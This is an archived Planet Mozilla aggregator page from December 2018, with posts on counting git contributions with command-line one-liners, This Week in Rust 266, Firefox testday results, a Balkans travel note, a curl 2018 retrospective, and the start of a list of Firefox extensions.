<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head xmlns="http://www.w3.org/1999/xhtml">
<meta content="application/xhtml+xml; charset=UTF-8" http-equiv="Content-Type" />
<title>Planet Mozilla</title><meta charset="utf-8" /><meta name="generator" content="Venus" /><link href="mozilla-16.png" rel="shortcut icon" type="image/png" /><link rel="alternate" href="http://planet.mozilla.org/atom.xml" title="Planet Mozilla" type="application/atom+xml" /><link rel="search" type="application/opensearchdescription+xml" title="Planet Mozilla search" href="http://planet.mozilla.org/opensearchdescription.xml" />
<link media="all" href="index.css" type="text/css" rel="stylesheet" />
</head>
<body xmlns="http://www.w3.org/1999/xhtml"><div id="utility"><p><strong>Looking For</strong></p><ul><li><a href="http://www.mozilla.org/">mozilla.org</a></li><li><a href="https://wiki.mozilla.org/">Wiki</a></li><li><a href="https://developer.mozilla.org/">Developer Center</a></li><li><a href="http://www.firefox.com/">Firefox</a></li><li><a href="http://www.getthunderbird.com/">Thunderbird</a></li></ul></div><div id="header"><div id="dino"><h1><a href="https://planet.mozilla.org/" title="Back to home page">Planet Mozilla</a></h1></div></div><div class="main-content"><h2><time datetime="2018-12-25">Tuesday, 25 December 2018</time></h2><div class="news shing-lyu"><a id="news-0"></a><h3><a href="https://shinglyu.github.io/" title="Shing Lyu - Articles">Shing Lyu</a> ‚Äî <a href="https://shinglyu.github.io/web/2018/12/25/counting-your-contribution-to-a-git-repository.html">Counting your contribution to a git repository</a></h3><div class="entry"><div class="content"><p>Sometimes you may wonder, how many commits or lines of code did I contributed to a git repository? Here are some easy one liners to help you count that.</p>



<h3>Number of commits</h3>

<p>Let‚Äôs start with the easy one: counting the number of commits made by one user.</p>

<p>The easiest way is to run</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git shortlog <span class="nt">-s</span>
</code></pre></div></div>

<p>This gives you a list of commit counts by user:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2  Grant Lindberg
9  Jonathan Hao
2  Matias Kinnunen
65  Shing Lyu
4  Shou Ya
1  wildsky
1  wildskyf
</code></pre></div></div>

<p>(The example comes from <a href="https://github.com/shinglyu/QuantumVim">shinglyu/QuantumVim</a>.)</p>

<p>If you only care about one user you can use</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git rev-list HEAD <span class="nt">--author</span><span class="o">=</span><span class="s2">"Shing Lyu"</span> <span class="nt">--count</span> 
</code></pre></div></div>

<p>, which prints <code class="highlighter-rouge">65</code>.</p>

<p>Let‚Äôs explain how this works:</p>
<ul>
  <li><code class="highlighter-rouge">git rev-list HEAD</code> will list the commit objects in <code class="highlighter-rouge">HEAD</code></li>
  <li><code class="highlighter-rouge">--author="Shing Lyu"</code> will filter out only the commits made by the author Shing Lyu</li>
  <li><code class="highlighter-rouge">--count</code> counts the number of commits. You can pipe it to <code class="highlighter-rouge">| wc -l</code> instead.</li>
</ul>

<h3>Count the line of insertion and deletions by a user</h3>

<p>Insertion and deletions are a little bit tricker. This is what I came up with:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git log <span class="nt">--author</span><span class="o">=</span>Shing <span class="nt">--pretty</span><span class="o">=</span>tformat: <span class="nt">--numstat</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^-'</span> | awk <span class="s1">'{ add+=$1; remove+=$2 } END { print add, remove }'</span> 
</code></pre></div></div>

<p>This might seem a little bit daunting, but we‚Äôll break it up into steps:</p>

<ul>
  <li>
    <p><code class="highlighter-rouge">git log --author="Shing Lyu"</code> list the commits by Shing Lyu, in the following format:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commit 6966b2c969cbf62029792221bf124ed75ee2c640
Author: Shing Lyu &lt;shing.lyu@gmail.com&gt;
Date:   Sat Nov 18 17:01:25 2017 +0100

    Added Ctrl+z to close all system tabs

commit f4710cc3a2efdc63c7caf3ec04d504912ad20a93
Author: Shing Lyu &lt;shing.lyu@gmail.com&gt;
Date:   Sat Nov 18 15:58:20 2017 +0100

    Bump version and diable jpm packaging
</code></pre></div>    </div>
  </li>
  <li>
    <p><code class="highlighter-rouge">--numstat</code> will give us the line added and removed per file per commit:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commit 6966b2c969cbf62029792221bf124ed75ee2c640
Author: Shing Lyu &lt;shing.lyu@gmail.com&gt;
Date:   Sat Nov 18 17:01:25 2017 +0100

    Added Ctrl+z to close all system tabs

    1       0       README.md
    10      0       manifest.json
    6       1       package.sh
    35      0       vim-background.js
    4       1       vim.js

commit f4710cc3a2efdc63c7caf3ec04d504912ad20a93
Author: Shing Lyu &lt;shing.lyu@gmail.com&gt;
Date:   Sat Nov 18 15:58:20 2017 +0100

    Bump version and diable jpm packaging

    1       1       manifest.json
    3       3       package.sh
</code></pre></div>    </div>
  </li>
  <li>
    <p>We don‚Äôt really need the commit, Author, Date and commit message fields, so we use an empty formatting string to get rid of them: <code class="highlighter-rouge">--pretty=tformat:</code></p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1       0       README.md
10      0       manifest.json
6       1       package.sh
35      0       vim-background.js
4       1       vim.js
1       1       manifest.json
3       3       package.sh
</code></pre></div>    </div>
  </li>
  <li>
    <p>If you add some non-text files, e.g. png image files, the insertion/deletion count might be represented as <code class="highlighter-rouge">- - foo.png</code>. Therefore we filter them out with <code class="highlighter-rouge">grep -v '^-'</code>. If you are not familiar with <code class="highlighter-rouge">grep</code>, <code class="highlighter-rouge">-v</code> means reverse match (i.e. find those lines that does NOT match the patter). The pattern <code class="highlighter-rouge">^-</code> means lines staring with a <code class="highlighter-rouge">-</code>. (This part is optional if you pipe to <code class="highlighter-rouge">awk</code>, <code class="highlighter-rouge">awk</code> seems to ignore non-numeric character while doing the math.)</p>
  </li>
  <li>
    <p>Finally we pipe it to <code class="highlighter-rouge">awk</code> for summing. Even if you are not familiar with <code class="highlighter-rouge">awk</code>, this part is pretty self-explanatory:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>awk <span class="s1">'{ add+=$1; remove+=$2 } END { print add, remove }'</span>
</code></pre></div>    </div>

    <p>We add column one (<code class="highlighter-rouge">$1</code>) to the variable <code class="highlighter-rouge">add</code>, and column two (<code class="highlighter-rouge">$2</code>) to the variable <code class="highlighter-rouge">remove</code>, then we print them out. This gives us an output like so:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>936 260 
</code></pre></div>    </div>
  </li>
</ul>

<h3>Other alternatives</h3>

<p>There are many other off-the-shelf scrips that will help you calculate contribution statistics. Like <a href="https://github.com/arzzen/git-quick-stats">git-quick-stats</a>, <a href="https://github.com/casperdcl/git-fame">git-fame</a> and <a href="https://github.com/oleander/git-fame-rb">git-fame-rb</a>. But if you only want a quick-and-easy solution please give it a try.</p></div></div><div class="permalink"><a href="https://shinglyu.github.io/web/2018/12/25/counting-your-contribution-to-a-git-repository.html">by Shing Lyu at <time datetime="2018-12-25T11:00:27Z" title="December 25, 2018 11:00 AM GMT">‰∏ãÂçà7:00:27</time></a></div></div><div class="news this-week-in-rust"><a id="news-1"></a><h3><a href="https://this-week-in-rust.org/" title="This Week in Rust">This Week In Rust</a> ‚Äî <a href="https://this-week-in-rust.org/blog/2018/12/25/this-week-in-rust-266/">This Week in Rust 266</a></h3><div class="entry"><div class="content"><p>Hello and welcome to another issue of <em>This Week in Rust</em>!
<a href="http://rust-lang.org/">Rust</a> is a systems language pursuing the trifecta: safety, concurrency, and speed.
This is a weekly summary of its progress and community.
Want something mentioned? Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> or <a href="https://github.com/cmr/this-week-in-rust">send us a pull request</a>.
Want to get involved? <a href="https://github.com/rust-lang/rust/blob/master/CONTRIBUTING.md">We love contributions</a>.</p>
<p><em>This Week in Rust</em> is openly developed <a href="https://github.com/cmr/this-week-in-rust">on GitHub</a>.
If you find any errors in this week's issue, <a href="https://github.com/cmr/this-week-in-rust/pulls">please submit a PR</a>.</p>
<h3>Updates from Rust Community</h3>
<h4>News &amp; Blog Posts</h4>
<ul>
<li>üéàüéâ <a href="https://blog.rust-lang.org/2018/12/20/Rust-1.31.1.html">Announcing Rust 1.31.1</a>. üéâüéà</li>
<li><a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">Procedural macros in Rust 2018</a>.</li>
<li><a href="https://tokio.rs/blog/2018-12-recap-2018/">Tokio: A great 2018, an even better 2019</a>.</li>
<li><a href="https://kornel.ski/rust-sys-crate">Using C libraries un Rust: making a <code>*-sys</code> crate</a>.</li>
<li><a href="https://github.com/Hexilee/async-io-demo">Rust asynchronous IO: from mio to coroutine</a>.</li>
<li><a href="https://www.joshmcguigan.com/blog/array-initialization-rust/">Methods for array initialization in Rust</a>.</li>
<li><a href="https://hashnode.com/post/currying-in-rust-part-3-the-circle-of-life-aka-why-borrowchecker-why-cjq3z1dd800dknds1sls4dqav">Currying in rust Part 3 (The circle of life... aka why borrowchecker... why)</a>!?</li>
<li><a href="https://hashnode.com/post/how-to-become-a-rust-super-developer-cjpv1ee7e000buhs2aqrdw2ym">How to get better at Rust: For beginners</a>.</li>
</ul>
<h5>#Rust2019</h5>
<p>Find all #Rust2019 posts at <a href="https://readrust.net/rust-2019/">Read Rust</a>.</p>
<h3>Crate of the Week</h3>
<p>This week's crate is <a href="https://sandspiel.info/">sandspiel</a>, a WASM-powered online sandbox automaton game. Thanks to <a href="https://users.rust-lang.org/t/crate-of-the-week/2704/473">Vikrant Chaudhary</a> for the suggestion!</p>
<p><a href="https://users.rust-lang.org/t/crate-of-the-week/2704">Submit your suggestions and votes for next week</a>!</p>
<h3>Call for Participation</h3>
<p>Always wanted to contribute to open-source projects but didn't know where to start?
Every week we highlight some tasks from the Rust community for you to pick and get started!</p>
<p>Some of these tasks may also have mentors available, visit the task page for more information.</p>
<ul>
<li><a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">A call for Rust 2019 Roadmap blog posts</a>.</li>
<li><a href="https://github.com/playXE/PEACE/issues/1">PEACE: Implement loading functions from static linked libraries</a>. PEACE is a simple JIT library.</li>
</ul>
<p>If you are a Rust project owner and are looking for contributors, please submit tasks <a href="https://users.rust-lang.org/t/twir-call-for-participation/4821">here</a>.</p>
<h3>Updates from Rust Core</h3>
<p>214 pull requests were <a href="https://github.com/search?q=is%3Apr+org%3Arust-lang+is%3Amerged+merged%3A2018-12-17..2018-12-24">merged in the last week</a></p>
<ul>
<li><a href="https://github.com/rust-lang/rust/pull/56947">add targets thumbv7neon-linux-androideabi and thumbv7neon-unknown-linux-gnueabihf</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/54125">less conservative uninhabitedness check</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57033">remove "visited" set from inhabitedness checking</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57060">short-circuit DefIdForest::intersection()</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56601">make the 'a lifetime on TyCtxt useless</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56219">trigger unsized coercions keyed on Sized bounds</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56160">fix various aspects around <code>let</code> bindings inside const functions</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56941">deny intra-doc link resolution failures in libstd</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/54252">process nested obligations in autoderef</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56953">mark tuple structs as live if their constructors are used</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57053">fix alignment for array indexing</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57021">enable emission of alignment attrs for pointer params</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56188">enum type instead of variant suggestion unification</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56973">make basic CTFE tracing available on release builds</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56964">remove <code>TokenStream::JointTree</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56981">miri: allocation is infallible</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56916">fix mutable references in <code>static mut</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56917">simplify MIR generation for logical operations</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56909">static eval: do not ICE on layout size overflow</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56887">disable field reordering for repr(int)</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56813">always run rustc in a thread</a></li>
<li><a href="https://github.com/rust-lang/rustfmt/pull/3250">version-gate the trailing semicolon change of return statements inside a match arm</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56802">add <code>DoubleEndedIterator::nth_back</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56764">mir-opt: make <code>SimplifyCfg</code> collapse goto chains starting from <code>bb0</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56741">treat ref-to-raw cast like a reborrow: do a special kind of retag</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56649">MIR borrowck doesn't accept the example of iterating and updating a mutable reference</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56647">rework treatment of <code>$crate</code> in procedural macros</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56613">tweak query code for performance</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56881">implement <code>Eq</code>, <code>PartialEq</code> and <code>Hash</code> for <code>atomic::Ordering</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56842">add unstable <code>VecDeque::rotate_</code>{<code>left</code>, <code>right</code>}</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56904">remove Cycle::try_fold override</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56550">short-circuit <code>Rc</code>/<code>Arc</code> equality checking on equal pointers where <code>T: Eq</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56805">stabilize <code>Rc</code>, <code>Arc</code> and <code>Pin</code> as method receivers</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57067">stabilize <code>min_const_unsafe_fn</code> in 1.33</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57002">stabilize <code>Vec(Deque)::resize_with</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56939">stabilize <code>Pin</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56303">stabilize <code>underscore_imports</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56944">bootstrap: Link LLVM as a dylib with ThinLTO</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56918">profiler: simplify total_duration, improve readability</a></li>
<li><a href="https://github.com/rust-lang/cargo/pull/6470">cargo: warn on unused patches</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/57011">rustdoc: add new CLI flag to load static files from a different location</a></li>
</ul>
<h4>Approved RFCs</h4>
<p>Changes to Rust follow the Rust <a href="https://github.com/rust-lang/rfcs#rust-rfcs">RFC (request for comments)
process</a>. These
are the RFCs that were approved for implementation this week:</p>
<p><em>No RFCs were approved this week.</em></p>
<h4>Final Comment Period</h4>
<p>Every week <a href="https://www.rust-lang.org/team.html">the team</a> announces the
'final comment period' for RFCs and key PRs which are reaching a
decision. Express your opinions now.</p>
<h5><a href="https://github.com/rust-lang/rfcs/labels/final-comment-period">RFCs</a></h5>
<p><em>No RFCs are currently in final comment period.</em></p>
<h5><a href="https://github.com/rust-lang/rust/labels/final-comment-period">Tracking Issues &amp; PRs</a></h5>
<ul>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/pull/56739">Make the getter for NonZero types into a const fn</a>.</li>
</ul>
<h4>New RFCs</h4>
<ul>
<li><a href="https://github.com/rust-lang/rfcs/pull/2618">Using enums like traits</a>.</li>
<li><a href="https://github.com/rust-lang/rfcs/pull/2617">Local <code>loop</code> bindings</a>.</li>
</ul>
<h3>Upcoming Events</h3>
<h5>Online</h5>
<ul>
<li><a href="https://t.me/joinchat/EkKINhHCgZ9llzvPidOssA">Jan 2. Rust Events Team Meeting on Telegram</a>.</li>
<li><a href="https://discordapp.com/channels/442252698964721669/443773747350994945">Jan 9. Rust Community Team Meeting on Discord</a>.</li>
</ul>
<h5>Europe</h5>
<ul>
<li><a href="https://users.rust-lang.org/t/35c3-rust-assembly-at-ccc-leipzig/22288">Dec 27 - 30. Leipzig, DE - Rust assembly at 35c3</a>.</li>
<li><a href="https://www.meetup.com/Rust-Zurich/events/253608548/">Jan 8. Rapperswil-Jona, CH - Rust Z√ºrichsee meetup at Coredump - Looking for a speaker</a>.</li>
<li><a href="https://www.meetup.com/opentechschool-berlin/events/rjgkhqyzcbmb/">Jan 9. Berlin, DE - Berlin Rust Hack and Learn</a>.</li>
<li><a href="https://rust-brno.github.io/">Jan 10. Brno, CZ - Rust meetup at Masaryk University</a>.</li>
</ul>
<h5>North America</h5>
<ul>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbnc/">Dec 30. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/indyrs/events/246726699/">Jan  2. Indianapolis, US - Indy.rs</a>.</li>
<li><a href="https://www.meetup.com/Rust-ATL/events/cbcmbqyzcbdb/">Jan  2. Atlanta, US - Rust Atlanta Meetup</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyzcbjb/">Jan  6. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/Vancouver-Rust/events/rzszlqyzcbmb/">Jan  9. Vancouver, CA - Vancouver Rust meetup</a>.</li>
</ul>
<p>If you are running a Rust event please add it to the <a href="https://www.google.com/calendar/embed?src=apd9vmbc22egenmtu5l6c5jbfc%40group.calendar.google.com">calendar</a> to get
it mentioned here. Please remember to add a link to the event too.
Email the <a href="mailto:community-team@rust-lang.org">Rust Community Team</a> for access.</p>
<h3>Rust Jobs</h3>
<ul>
<li><a href="https://www.linkedin.com/jobs/cap/view/948142464/?pathWildcard=948142464&amp;trk=mcm">Rust Developer at XAIN, Berlin, DE</a>.</li>
<li><a href="https://maidsafe.net/careers/#networking_engineer">Networking Engineer at MaidSafe, Ayr, GB (Remote)</a>.</li>
<li><a href="https://bitfinex.recruitee.com/o/senior-backendblockchain-developer-with-rust-remote">Senior Backend/Blockchain Developer with Rust at BitFinex, Remote</a>.</li>
<li><a href="https://paritytech.io/jobs/">Rust Developer at Parity, Berlin, DE</a>.</li>
<li><a href="https://www.mersive.com/company/join-mersive-team/?gh_jid=4136286002">Sr. Software Engineer - Rust at Mersive, Denver, US</a>.</li>
<li><a href="https://www.pse.kit.edu/karriere/joboffer.php?id=2093&amp;language=en">Embedded operating system developer, Karlsruhe, DE</a>.</li>
<li><a href="https://twitter.com/oli_obk/status/1064856324071178240">Student research assistant (embedded), Karlsruhe, DE</a>.</li>
</ul>
<p><em>Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> to get your job offers listed here!</em></p>
<h3>Quote of the Week</h3>
<blockquote>
<p>Using (traits) for Inheritance was like putting car wheels on a boat because I am used to driving a vehicle with wheels.</p>
</blockquote>
<p>‚Äì Marco Alka <a href="https://hashnode.com/post/how-to-become-a-rust-super-developer-cjpv1ee7e000buhs2aqrdw2ym">on Hashnode</a></p>
<p>Thanks to <a href="https://users.rust-lang.org/t/twir-quote-of-the-week/328/590">oberien</a> for the suggestion!</p>
<p><a href="http://users.rust-lang.org/t/twir-quote-of-the-week/328">Please submit your quotes for next week</a>!</p>
<p><em>This Week in Rust is edited by: <a href="https://github.com/nasa42">nasa42</a>, <a href="https://github.com/llogiq">llogiq</a>, and <a href="https://github.com/Flavsditz">Flavsditz</a>.</em></p>
<p><small><a href="https://www.reddit.com/r/rust/comments/a9nw7t/this_week_in_rust_266/">Discuss on r/rust</a>.</small></p></div></div><div class="permalink"><a href="https://this-week-in-rust.org/blog/2018/12/25/this-week-in-rust-266/">by TWiR Contributors at <time datetime="2018-12-25T05:00:00Z" title="December 25, 2018 05:00 AM GMT">‰∏ãÂçà1:00:00</time></a></div></div><h2><time datetime="2018-12-24">Monday, 24 December 2018</time></h2><div class="news qmo" xml:lang="en-US"><a id="news-2"></a><h3><a href="https://quality.mozilla.org/" title="Mozilla Quality Assurance">QMO</a> ‚Äî <a href="https://quality.mozilla.org/2018/12/firefox-65-beta-6-testday-results/">Firefox 65 Beta 6 Testday Results</a></h3><div class="entry"><div class="content"><p>Hello Mozillians!</p>
<p>As you may already know, last Friday December 21st ‚Äì we held a new Testday event, for Firefox 65 Beta 6.</p>
<p>Thank you all for helping us make Mozilla a better place: priyadharshini A.</p>
<p>From the Bangladesh team: Sayed Ibn Masud, Osman Noyon, Alamin Shikder, Farhan Sadik Galib, Tanjia Akter Kona, Hossain Al Ikram, Basirul Fahad, Md. Majedul Islam, Sajedul Islam, Maruf Rahman and Forhad Hossain.<br />
From the India team: Mohammed Adam and Adam24, Mohamed Bawas, Aishwarya Narasimhan@Aishwarya, Showkath begum.J and priyadharshini A.</p>
<p>Results:</p>
<p>‚Äì several test cases executed for the &lt;notificationbox&gt; &amp; &lt;notification&gt; changes and Update Directory;<br />
‚Äì bugs verified: 1501161, 1509277, 1511751, 1504268, 1501992, 1315509, 1510734, 1511954, 1509711, 1509889, 1511074, 1510734, 1506114, 1505801, 1450973, 1509889, 1511954, 1315509, 1501992, 1512047, 1237076;<br />
‚Äì bugs confirmed: 1515995, 1515906;<br />
‚Äì bug filled: 1516124;</p>
<p>Thanks for another successful testday! <img alt="üôÇ" class="wp-smiley" src="1f642.png" style="height: 1em;" /></p></div></div><div class="permalink"><a href="https://quality.mozilla.org/2018/12/firefox-65-beta-6-testday-results/">by Bogdan Maris at <time datetime="2018-12-24T13:09:21Z" title="December 24, 2018 01:09 PM GMT">‰∏ãÂçà9:09:21</time></a></div></div><div class="news daniel-pocock" xml:lang="en"><a id="news-3"></a><h3><a href="https://danielpocock.com/tags/mozilla" title="DanielPocock.com - mozilla">Daniel Pocock</a> ‚Äî <a href="https://danielpocock.com/merry-christmas-balkans-2018">Merry Christmas from the Balkans</a></h3><div class="entry"><div class="content"><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>This Christmas I'm visiting the Balkans again.  It is the seventh time in the last two years that I have been fortunate enough to visit this largely undiscovered but very exciting region of Europe.</p>
<h3>A change of name</h3>
<p>On Saturday I visited Skopje, the capital of Macedonia.  Next month their country will finalize their name change to the Republic of Northern Macedonia.</p>
<h3>Prishtina</h3>
<p>From Skopje, I travelled north to Prishtina, the capital of Kosovo.</p>
<p>I had dinner with four young women who have become outstanding leaders in the free software movement in the region, Albiona, <a href="https://elenagjevukaj.github.io/">Elena</a>, Amire and Enkelena.</p>
<p>The population of Kosovo is over ninety percent Muslim, not everybody observes Christmas as a religious festival but nonetheless the city of Prishtina is decorated beautifully with several large trees in the pedestrianised city centre.</p>
<p><img src="img_5201_cropped.jpeg" /></p>
</div></div></div></div></div><div class="permalink"><a href="https://danielpocock.com/merry-christmas-balkans-2018">by Daniel.Pocock at <time datetime="2018-12-23T22:27:37Z" title="December 23, 2018 10:27 PM GMT">‰∏äÂçà6:27:37</time></a></div></div><div class="news daniel-stenberg" xml:lang="en-US"><a id="news-4"></a><h3><a href="https://daniel.haxx.se/blog" title="daniel.haxx.se">Daniel Stenberg</a> ‚Äî <a href="https://daniel.haxx.se/blog/2018/12/23/a-curl-2018-retrospective/">A curl 2018 retrospective</a></h3><div class="entry"><div class="content"><p>Another year reaches its calendar end and a new year awaits around the corner. In the curl project we‚Äôve had another busy and event-full year. Here‚Äôs a look back at some of the fun we‚Äôve done during 2018.</p>



<h3>Releases<br /></h3>



<p>We started out the year with the <a href="https://daniel.haxx.se/blog/2018/01/24/cheers-for-curl-7-58-0/">7.58.0</a> release in January, and we managed to squeeze in another six releases during the year. In total we count 658 documented bug-fixes and 31 changes. The total number of bug-fixes was actually slightly lower this year compared to last year‚Äôs 683. An average of 1.8 bug-fixes per day is still not too shabby.</p>



<h3>Authors</h3>



<p>I‚Äôm very happy to say that we again managed to break our previous record as 155 unique authors contributed code. 111 of them for the first time in the project, and 126 did fewer than three commits during the year. Basically this means we merged code from a brand new author every three days through-out the year!</p>



<figure class="wp-block-image"><img alt="" class="wp-image-11888" src="unique-authors-per-year.png" /></figure>



<p>The list of ‚Äúcontributors‚Äù, where we also include helpers, bug reporters, security researchers etc, increased with another 169 new names this year to a total of 1829 in the last release of the year.  That‚Äôs 169 <em>new</em> names. Of course we also got a lot of help from people who were already mentioned in there!</p>



<p>Will we be able to reach 2000 names before the end of 2019?<br /></p>



<h3>Commits</h3>



<p>At the time of this writing, almost two weeks before the end of the year, we‚Äôre still behind the last few years with 1051 commits done this year. 1381 commits were done in 2017.<br /></p>



<figure class="wp-block-image"><img alt="" class="wp-image-11889" src="commits-per-year.png" /></figure>



<h3>Daniel‚Äôs commit share</h3>



<p>I personally authored 535 (50.9%) of all commits during 2018. Marcel Raad did 65 and Daniel Gustafsson 61. In general I maintain my general share of the changes done in the project over time. Possibly I‚Äôve even increased it slightly the last few years. This graph shows my share of the commits layered on top of the number of commits done.<br /></p>



<figure class="wp-block-image"><img alt="" class="wp-image-11893" src="daniels-share-of-commits.png" /></figure>



<h3>Vulnerabilities</h3>



<p>This year we got exactly the same amount of security problems reported as we did last year: 12. Some of the problems were one-off due curl being added to the <a href="https://daniel.haxx.se/blog/2017/10/12/testing-curl/">OSS-Fuzz</a> project in 2018 and it has taken a while to really hit some of our soft spots and as we‚Äôve seen a slow-down in reports from there it‚Äôll be interesting to see if 2019 will be a brighter year in this department. (In total, OSS-Fuzz is credited for having found six security vulnerabilities in curl to date.)</p>



<figure class="wp-block-image"><img alt="" class="wp-image-11890" src="vulnerabilities-per-year.png" /></figure>



<p>During the year we manage to both <a href="https://daniel.haxx.se/blog/2018/09/21/curl-bug-bounty-2/">introduce new bug bounty program</a> as well as <a href="https://curl.haxx.se/mail/lib-2018-11/0048.html">retract that very same again</a> when it shut down almost at once! <img alt="üôÅ" class="wp-smiley" src="1f641.png" style="height: 1em;" /><br /></p>



<h3>Lines of code</h3>



<p>Counting all lines in the git repo in the src, lib and include directories, they grew nearly 6,000 lines (3.7%) during the year to 155,912. The primary code growing activities this year were:</p>



<ol><li><a href="https://daniel.haxx.se/blog/2018/09/06/doh-in-curl/">DNS-over-HTTPS support</a></li><li>The new <a href="https://daniel.haxx.se/blog/2018/09/09/libcurl-gets-a-url-api/">URL API</a> and using that internally as well</li></ol>



<h3>Deprecating legacy</h3>



<p>In July we created the <a href="https://curl.haxx.se/dev/deprecate.html">DEPRECATE.md</a> document to keep order of some things we‚Äôre stowing away in the cyberspace attic. During the year we cut off axTLS support as a first example of this deprecation procedure. HTTP pipelining, global DNS cache and HTTP/0.9 accepted by default are features next in line marked for removal, and the two first are already disabled in code.<br /></p>



<h3>curl up<br /></h3>



<div class="wp-block-image"><figure class="alignright is-resized"><img alt="" class="wp-image-11089" src="curlup-2018-whitebg-1200x504.png" width="239" height="100" /></figure></div>



<p>We had our <a href="https://daniel.haxx.se/blog/2018/04/16/curl-up-2018-summary/">second curl conference</a> this year; in Stockholm. It was blast again and I‚Äôm already looking forward to <a href="https://daniel.haxx.se/blog/2018/10/24/curl-up-2019-will-happen-in-prague/">curl up 2019 in Prague</a>.</p>



<h3>Sponsor updates</h3>



<p>Yours truly <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/">quit Mozilla</a> and with that we lost them as a <a href="https://curl.haxx.se/sponsors.html">sponsor of the curl</a> project. We have however gotten several new backers and sponsors over the year since <a href="https://opencollective.com/curl">we joined opencollective</a>, and can receive donations from there.</p>



<h3>Governance</h3>



<p>Together with a bunch of core team members I put together a two-step <a href="https://curl.haxx.se/mail/lib-2018-10/att-0033/curl__governance__money_and_the_future.pdf">proposal</a> that I posted back in October:</p>



<ol><li>we join an umbrella organization</li><li>we create a ‚Äúboard‚Äù to decide over money</li></ol>



<p>As the first step turned out to be a very slow operation (ie we‚Äôve applied, but the process has not gone very far yet) we haven‚Äôt yet made step 2 happen either.<br /></p>



<h3>2019</h3>



<p>Things that didn‚Äôt happen in 2018 but very well might happen in 2019 include:</p>



<ol><li>Some first <a href="https://daniel.haxx.se/blog/2018/11/11/http-3/">HTTP/3</a> and QUIC code attempts in curl</li><li>HSTS support? A pull request for this has been lingering for a while already.<br /></li></ol>



<p><em>Note: the numbers for 2018 in this post were extracted and graphs were prepared a few weeks before the actual end of year, so some of the data quite possibly changed a little bit since.</em></p></div></div><div class="permalink"><a href="https://daniel.haxx.se/blog/2018/12/23/a-curl-2018-retrospective/">by Daniel Stenberg at <time datetime="2018-12-23T17:01:34Z" title="December 23, 2018 05:01 PM GMT">‰∏äÂçà1:01:34</time></a></div></div><h2><time datetime="2018-12-21">Friday, 21 December 2018</time></h2><div class="news ludovic-hirlimann" xml:lang="en"><a id="news-5"></a><h3><a href="https://www.hirlimann.net/Ludovic/carnet/" title="Carnet de Ludovic - Mozilla">Ludovic Hirlimann</a> ‚Äî <a href="https://www.hirlimann.net/Ludovic/carnet/?post/2018/12/21/December-2018-what-extensions-do-I-use-in-Firefox-dsktop">December 2018 - what extensions do I use in Firefox desktop</a></h3><div class="entry"><div class="content"><p>Here is the current list of extensions I have in my Firefox  desktop <a href="https://www.mozilla.org/en-US/firefox/channel/desktop/#nightly" hreflang="en">nightly</a> profile :</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/" hreflang="en">Firefox Multi-Account Containers</a></h3>

